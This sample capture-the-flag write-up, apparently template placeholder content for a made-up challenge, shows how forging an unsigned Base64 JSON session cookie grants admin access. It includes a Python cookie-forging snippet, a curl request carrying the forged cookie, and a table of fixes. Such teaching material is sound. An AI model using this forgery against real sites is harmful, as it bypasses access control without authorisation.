---
title: Cookie Jar
ctf: Sample CTF 2026
category: web
tags: [Cookies, Broken Access Control, Base64]
date: 2026-11-10
difficulty: Easy
description: A sample write-up. The role is stored in a cookie the user can edit.
---

> This is a **sample write-up** about a made-up challenge. It exists so the site has something to show. Delete it once you have real write-ups.

## Challenge

> The cookie jar is open to everyone, but only the admin gets the flag.
>
> Flag format: `SAMPLE{...}`

The site has a login page and a `/flag` page that answers `Admins only`.

## Recon

After logging in as a guest, the server sets one cookie:

```http
Set-Cookie: session=eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9
```

It looks like Base64, so decode it:

```bash
echo 'eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9' | base64 -d
# {"user":"guest","role":"user"}
```

The cookie is plain JSON with no signature. Nothing stops us from changing it.

## Solution

### Forge the cookie

```python
import base64
import json

session = {"user": "guest", "role": "admin"}
print(base64.b64encode(json.dumps(session, separators=(",", ":")).encode()).decode())
```

### Send it

```bash
curl -s https://cookie-jar.example/flag \
  -H 'Cookie: session=eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ=='
```

The server answers with the flag: `SAMPLE{n3v3r_trust_th3_cl13nt}`.

## What I learned

| Mistake | Fix |
| --- | --- |
| Role stored on the client | Keep the session on the server |
| Cookie not signed | Sign it, and verify the signature |

Anything the browser holds can be edited by the user. Encoding is not protection.
